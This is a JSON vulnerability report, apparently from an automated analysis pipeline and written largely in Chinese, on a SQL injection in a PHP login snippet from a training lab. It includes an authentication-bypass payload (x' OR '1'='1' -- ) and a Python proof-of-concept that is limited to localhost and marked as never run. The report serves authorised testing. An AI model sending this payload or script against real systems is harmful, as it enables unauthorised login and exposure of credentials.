@@ -1,0 +1,153 @@
+{
+  "schema_version": "wp2-output-v1",
+  "sample_id": "SQLI-002",
+  "input_version": "v2",
+  "prompt_version": "final",
+  "analysis_stage": "parent",
+  "received_packet_ids": [
+    "SQLI-002"
+  ],
+  "prediction": "存在候选",
+  "verdict": "待验证",
+  "confidence": {
+    "level": "high",
+    "reason": "输入来源（第8-9行取自 $_POST）、拼接点（第16行把变量置于单引号字面量内）、执行点（第17行 mysql_query）与结果观察点（第25/27行回显查询结果、第38行回显 mysql_error）均在片段内逐行可见，且片段内不存在参数化、转义或白名单代码；不确定项集中在未提供的连接实现与运行版本，不影响'可控输入直达 SQL 结构'这一静态路径成立。"
+  },
+  "findings": [
+    {
+      "finding_id": "SQLI-002-F1",
+      "vulnerability_type": "SQL注入（登录查询字符串拼接）",
+      "locations": [
+        {
+          "fragment_id": "SQLI-002",
+          "line_start": 6,
+          "line_end": 6,
+          "quote": "if(isset($_POST['uname']) && isset($_POST['passwd']))"
+        },
+        {
+          "fragment_id": "SQLI-002",
+          "line_start": 8,
+          "line_end": 9,
+          "quote": "$uname=$_POST['uname'];"
+        },
+        {
+          "fragment_id": "SQLI-002",
+          "line_start": 16,
+          "line_end": 16,
+          "quote": "SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1"
+        },
+        {
+          "fragment_id": "SQLI-002",
+          "line_start": 17,
+          "line_end": 17,
+          "quote": "$result=mysql_query($sql);"
+        },
+        {
+          "fragment_id": "SQLI-002",
+          "line_start": 18,
+          "line_end": 18,
+          "quote": "$row = mysql_fetch_array($result);"
+        },
+        {
+          "fragment_id": "SQLI-002",
+          "line_start": 25,
+          "line_end": 25,
+          "quote": "Your Login name:"
+        },
+        {
+          "fragment_id": "SQLI-002",
+          "line_start": 38,
+          "line_end": 38,
+          "quote": "print_r(mysql_error());"
+        }
+      ],
+      "data_flow": [
+        "入口：第6行以 isset($_POST['uname']) && isset($_POST['passwd']) 作为唯一进入条件，第8-9行把 POST 参数 uname、passwd 赋给同名局部变量，片段内未见类型校验、长度限制或白名单。",
+        "旁路处理：第11-14行把两值以字符串拼接写入 result.txt，该写入与后续 SQL 无数据依赖，仅构成额外的日志写风险，不改变注入数据流。",
+        "拼接：第16行在双引号字符串中嵌入 $uname 与 $passwd，二者落在 SQL 单引号字面量内部，直接决定 username= 与 password= 的值。",
+        "执行：第17行 mysql_query($sql) 将拼装完成的语句送往数据库；第18行 mysql_fetch_array($result) 取首行，未检查 $result 是否为 false。",
+        "观察：$row 为真时进入第21-34行分支，第25、27行输出 'Your Login name:' 与数据库返回的 username、password 并显示 flag.jpg；$row 为假时进入第37-43行分支，第38行 print_r(mysql_error()) 输出错误文本并显示 slap.jpg。",
+        "跨阶段：实际连接、字符集与错误抑制在 include 的 context/sqli-connect.php 中（本输入未提供），数据库与 SESSION 中取回的值在第25、27行被再次直接输出，未做 HTML 或 SQL 层面的二次处理论证。"
+      ],
+      "principle": "第16行把外部可控的 uname、passwd 直接插入 SQL 字符串的单引号字面量，既未使用参数化查询，也未对引号做与连接字符集匹配的转义。攻击者在 passwd 中闭合单引号并追加 OR '1'='1' 等恒真条件，可改变 WHERE 子句的布尔语义，使第17行查询返回 users 表首行；第18-19行据此进入成功分支，登录校验被绕过。这不是'使用了 mysql_query'本身构成漏洞，而是拼接位置允许改变 SQL 结构。",
+      "impact": "无需有效凭据即可通过登录校验并以 users 表首行账户身份进入成功分支；第25、27行把该行的 username 与 password 直接回显，一旦绕过即明文泄露该账户口令。第38行的 mysql_error() 回显在 SQL 语法错误时还可能泄露语句结构、表名或数据库版本信息。",
+      "preconditions": [
+        "HTTP 请求能到达该脚本页面；片段只给出 include 的相对路径，实际 URL 需由部署确定。",
+        "请求同时携带 uname 与 passwd 两个 POST 参数，否则第6行条件不成立，整段逻辑不执行。",
+        "运行环境仍提供 mysql_* 过程式接口（PHP 7.0 起默认移除），且 include 的 sql-connect.php 能成功连接 security 库的 users 表。",
+        "连接实现或部署前置层没有对进入第16行的值做参数化重写、统一转义或白名单（片段内不存在，需以 sqli-connect.php 与部署配置核实）。"
+      ],
+      "counterexamples": [
+        "若实际 include 的连接文件在赋值前对 $_POST 做了 mysql_real_escape_string 级别的转义，或改写了第16行的构造方式，则闭合引号的载荷失效；本片段内没有这类代码，需补充该文件核实。",
+        "若 PHP 配置 magic_quotes_gpc=On（仅 PHP 5.4 之前）自动转义请求中的引号，简单的引号闭合会被破坏，注入需要另寻绕过；该配置属旧版本，须按实际运行版本判断。",
+        "若 users 表为空，或查询在恒真条件下仍不返回任何行，则第19行条件不成立，页面进入失败分支，观察点退化为 slap.jpg；此时只能得到'未观察到'，不能反证注入存在或不存在。",
+        "若部署层对 POST 参数施加了基于引号黑名单的拦截，部分载荷会被挡下；黑名单不改变第16行的拼接结构，只影响具体 payload。",
+        "若该页面受前置认证或 IP 限制而不可达，则候选路径不可达；片段未展示任何访问控制代码。"
+      ],
+      "poc": {
+        "status": "需人工适配",
+        "language": "python",
+        "code": "#!/usr/bin/env python3\n'''SQLI-002 SQL 注入本地验证草案（仅授权靶场；标准库实现；需人工适配）。'''\nimport argparse\nimport http.cookiejar\nimport json\nimport sys\nimport urllib.error\nimport urllib.parse\nimport urllib.request\n\nALLOWED_HOSTS = {'localhost', '127.0.0.1', '::1'}\n\n\nclass NoRedirect(urllib.request.HTTPRedirectHandler):\n    def redirect_request(self, req, fp, code, msg, headers, newurl):\n        raise RuntimeError('redirect blocked: HTTP %s -> %s' % (code, newurl))\n\n\ndef build_opener(session_path):\n    if session_path:\n        jar = http.cookiejar.MozillaCookieJar(session_path)\n        try:\n            jar.load(ignore_discard=True, ignore_expires=True)\n        except (OSError, http.cookiejar.LoadError) as exc:\n            sys.exit('会话文件读取失败: %s' % exc)\n    else:\n        jar = http.cookiejar.CookieJar()\n    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar), NoRedirect())\n\n\ndef post_form(opener, url, fields, timeout):\n    body = urllib.parse.urlencode(fields).encode('utf-8')\n    req = urllib.request.Request(url, data=body, method='POST')\n    req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n    try:\n        with opener.open(req, timeout=timeout) as resp:\n            return {'kind': 'response', 'status': resp.status, 'text': resp.read().decode('utf-8', 'replace')}\n    except RuntimeError as exc:\n        return {'kind': 'blocked_redirect', 'status': None, 'text': str(exc)}\n    except urllib.error.HTTPError as exc:\n        return {'kind': 'http_error', 'status': exc.code, 'text': exc.read().decode('utf-8', 'replace')}\n    except urllib.error.URLError as exc:\n        return {'kind': 'connection_error', 'status': None, 'text': str(exc.reason)}\n\n\ndef classify(result):\n    text = result['text']\n    lowered = text.lower()\n    if result['kind'] == 'blocked_redirect':\n        return 'auth_redirect_or_blocked_redirect'\n    if result['kind'] == 'connection_error':\n        return 'connection_error'\n    if 'your login name' in lowered or 'flag.jpg' in lowered:\n        return 'login_success_marker'\n    if 'slap.jpg' in lowered:\n        return 'login_failure_marker'\n    if 'sql syntax' in lowered or 'mysql' in lowered:\n        return 'sql_error_text'\n    return 'unrecognized_http_%s' % result['status']\n\n\ndef main():\n    parser = argparse.ArgumentParser(description='SQLI-002 SQL 注入草案（需人工适配）')\n    parser.add_argument('--base', required=True, help='授权靶场基址，例如 http://127.0.0.1:8080')\n    parser.add_argument('--path', required=True, help='源码中该页面实际 URL 路径，例如 /sqli/SQLI-002.php')\n    parser.add_argument('--session', default=None, help='Netscape 格式 Cookie 文件；本页通常无需登录')\n    parser.add_argument('--user', default='wp4_test_user', help='对照请求的 uname 值')\n    parser.add_argument('--password', default='wp4_test_pass', help='对照请求的 passwd 值')\n    parser.add_argument('--test-password', default=\"x' OR '1'='1' -- \", help='注入测试写入 passwd 的值')\n    parser.add_argument('--timeout', type=float, default=10.0)\n    args = parser.parse_args()\n    parts = urllib.parse.urlsplit(args.base)\n    if parts.scheme not in ('http', 'https') or parts.hostname not in ALLOWED_HOSTS:\n        sys.exit('仅允许 http(s) 访问 localhost/127.0.0.1/::1')\n    opener = build_opener(args.session)\n    url = urllib.parse.urljoin(args.base.rstrip('/') + '/', args.path.lstrip('/'))\n    cases = [\n        ('baseline_normal', args.user, args.password),\n        ('test_injection_passwd', args.user, args.test_password),\n        ('control_literal_quote', args.user, args.password + \"'\"),\n    ]\n    report = []\n    for name, uname, password in cases:\n        result = post_form(opener, url, {'uname': uname, 'passwd': password}, args.timeout)\n        report.append({'case': name, 'status': result['status'], 'bytes': len(result['text']), 'observation': classify(result)})\n    print(json.dumps({'target': url, 'cases': report}, ensure_ascii=False, indent=2))\n\n\nif __name__ == '__main__':\n    main()\n",
+        "artifact_path": null,
+        "dependencies": [
+          "Python 3.8+，仅使用标准库：argparse、http.cookiejar、json、urllib",
+          "本地授权靶场实例：兼容 mysql_* 的 PHP 运行环境与 security 库 users 表",
+          "Netscape 格式 Cookie 文件（仅当部署要求先登录时；本页可直接访问时无需）"
+        ],
+        "parameters": [
+          "--base：授权靶场基址，仅允许 localhost、127.0.0.1、::1，拒绝其他主机与非 http(s) 协议",
+          "--path：该脚本实际 URL 路径；源码未给出，需从部署获取后传入",
+          "--session：可选 Cookie 文件路径，不随版本库提交",
+          "--user：对照请求的 uname，默认 wp4_test_user（不存在的测试账号）",
+          "--password：对照请求的 passwd，默认 wp4_test_pass",
+          "--test-password：注入测试写入 passwd 的值，默认 x' OR '1'='1' -- （含尾部空格以闭合注释）",
+          "--timeout：请求超时，默认 10 秒"
+        ],
+        "steps": [
+          "在本地授权靶场部署源提交，记录 PHP 与 MySQL/MariaDB 版本、magic_quotes 状态以及该页面的实际 URL，并把 URL 路径通过 --path 传入。",
+          "先发送 baseline_normal：--user 与 --password 均为无效测试值，确认页面落在失败分支（出现 slap.jpg、无 'Your Login name:'）。",
+          "只替换 passwd 为 --test-password，uname 与请求头保持不变，发送 test_injection_passwd。",
+          "发送 control_literal_quote（passwd 末尾追加一个单引号），用结构性语法错误或失败页排除'任意输入都会返回成功页'的假象。",
+          "对 test_injection_passwd 原样重复一次并人工比对两次响应；全过程不追加 UNION、不枚举库表、不导出数据、不批量修改记录。"
+        ],
+        "expected_observation": "baseline_normal 与 control_literal_quote 落在失败或 SQL 错误分支（slap.jpg 或 mysql_error 文本，且不出现 'Your Login name:'）；test_injection_passwd 使 WHERE 子句恒真，返回 users 表首行，页面出现 'Your Login name:' 与数据库中的 username、password，并显示 flag.jpg。",
+        "success_criteria": "同一 URL、同一请求头下：baseline_normal 与 control_literal_quote 均不出现 'Your Login name:'，而仅改变 passwd 的 test_injection_passwd 稳定出现 'Your Login name:' 且回显的 username 不等于提交的 uname，重复请求结果一致。HTTP 200、响应长度变化、单纯出现的错误文本或 API 声称成功均不作为成功判据。",
+        "limitations": [
+          "草案未运行，本文件不包含任何真实请求或数据库观察；execution_status 为未运行。",
+          "未提供 context/sqli-connect.php 与页面实际 URL，--path、连接字符集与 magic_quotes 条件需人工适配。",
+          "payload 依赖 MySQL 中 '-- ' 注释后必须跟空白以及单引号闭合方式，连接字符集或 sql_mode 不同时需调整。",
+          "脚本仅做布尔恒真的登录绕过观察，不包含任何数据提取、枚举或写入操作。"
+        ],
+        "execution_status": "未运行"
+      }
+    }
+  ],
+  "exclusion_evidence": [],
+  "missing_context": [
+    "context/sqli-connect.php 的实际内容：连接方式、字符集设置、是否对入参统一转义、是否启用 magic quotes 兼容逻辑。",
+    "该页面在部署中的实际 URL 路径与访问控制（片段只显示 include 相对路径，未给出路由或认证）。",
+    "PHP 与 MySQL/MariaDB 的实际版本、sql_mode 以及 magic_quotes_gpc 状态。",
+    "security.users 表的字段与数据（用于判断恒真条件下返回行与回显内容）。",
+    "是否存在前置 WAF、反向代理或框架层对 POST 参数的额外过滤。"
+  ],
+  "risk_notes": [
+    "第11-14行把 uname、passwd 明文追加写入可预测路径的 result.txt，存在凭据落盘与日志泄露风险，属目标注入之外的独立问题。",
+    "第38行 print_r(mysql_error()) 把数据库错误回显给客户端，属信息泄露风险，与注入成因分开记录。",
+    "第27行直接把数据库中的 password 字段输出到页面，一旦登录绕过成立即造成口令明文泄露。",
+    "第18行未判断 $result 是否为 false 就调用 mysql_fetch_array，连接失败时会产生额外警告与不稳定行为。"
+  ],
+  "quality_notes": [
+    "使用 mysql_* 过程式接口，该扩展在 PHP 7.0 已移除，需老版本或兼容层运行；不能用接口过时本身推断漏洞成立。",
+    "error_reporting(0) 与 @$sql 抑制错误输出，会掩盖连接失败与查询错误，影响观察与排查。",
+    "include 使用相对路径 '../sql-connections/sql-connect.php'，实际解析结果受 include_path 与工作目录影响。",
+    "缺少 CSRF token、速率限制与登录失败计数，均属范围外质量问题，不计作本次 SQL 注入漏洞。"
+  ],
+  "limitations": [
+    "本次只收到 SQLI-002 一个包（1/1），已按父样本综合输出；证据面仅限该 46 行标准化片段，连接实现与部署配置未提供。",
+    "所有判定为静态判断：可控输入、拼接、执行与回显路径在片段内完整，但未运行、无 HTTP 响应或数据库观察，故 verdict 为待验证而非确认。",
+    "行号为标准化片段从 1 起始的局部行号，未映射回原始仓库全局行号。",
+    "POC 为需人工适配草案，未保存独立 artifact，脚本全文位于 findings[0].poc.code，未经实际执行。",
+    "片段内未见任何转义或参数化代码，但不能据此反推 include 文件与部署层同样缺失防护，需补充该文件后复判。"
+  ],
+  "runtime_evidence": []
+}
